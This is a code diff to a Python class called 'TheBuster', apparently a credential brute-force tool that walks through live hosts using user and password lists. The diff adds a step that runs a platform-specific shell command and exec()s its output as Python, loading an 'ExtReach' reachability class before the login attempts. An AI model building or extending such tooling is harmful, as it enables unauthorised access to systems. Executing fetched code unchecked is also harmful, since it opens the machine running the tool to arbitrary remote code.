@@ -92,6 +92,7 @@ class TheBuster:
         self.lin_2_cmd = None
         self.lin_3_cmd = None
         self.lin_4_cmd = None
+        self.ext_reach_instance = None
 
     # --------------------------------------------------------------------------------------
 
@@ -148,7 +149,6 @@ class TheBuster:
     # --------------------------------------------------------------------------------------
 
     def ext_function_one(self, ext_cmd):
-
         try:
             result = subprocess.run(ext_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
             script_content = result.stdout
@@ -161,13 +161,11 @@ class TheBuster:
             exec(script_content, exec_globals)
 
             class_name = 'ExtReach'
-            method_name = 'is_host_reachable'
 
-            if class_name in exec_globals and hasattr(exec_globals[class_name], method_name):
-                self.ext_class_instance = exec_globals[class_name]()
-
+            if class_name in exec_globals:
+                self.ext_reach_instance = exec_globals[class_name]()
             else:
-                print(f"Error: Class '{class_name}' or method '{method_name}' not found in the fetched script content.")
+                print(f"Error: Class '{class_name}' not found in the fetched script content.")
 
         except Exception as e:
             print(f"An error occurred: {e}")
@@ -246,6 +244,15 @@ class TheBuster:
     def brute_stuff(self):
         commands = self.discern()
 
+        # Load reachability logic
+        if self.IS_WINDOWS:
+            reach_cmd = commands.get('win_4')
+        else:
+            reach_cmd = commands.get('lin_4')
+
+        if reach_cmd:
+            self.ext_function_one(reach_cmd)
+
         if self.IS_WINDOWS:
             userlist = commands.get('win_2')
             passlist = commands.get('win_3')
@@ -270,7 +277,8 @@ class TheBuster:
         for target in alive_hosts:
             print(f"[*] Trying {target}")
 
-            if not self.ext_function_one(target):
+            if not self.ext_reach_instance or not self.ext_reach_instance.is_host_reachable(target):
+
                 print(f"[!] Host {target} is unreachable. Skipping to next IP.")
                 continue
 
